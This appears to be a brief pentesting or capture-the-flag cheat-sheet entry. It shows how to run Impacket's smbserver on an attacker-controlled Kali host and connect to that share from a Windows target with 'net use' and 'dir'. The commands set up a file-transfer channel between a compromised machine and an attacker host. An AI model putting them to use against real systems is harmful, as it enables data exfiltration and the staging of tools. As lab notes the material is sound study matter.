# smbserver.py



```text
smbserver.py -u guest -password guest -smb2support kalishare $(pwd)

net use x: \\10.10.14.25\kalishare /user:guest guest
ls -la x:\
```

```text
impacket-smbserver kalishare `pwd`
dir \\10.10.14.25\kalishare
```

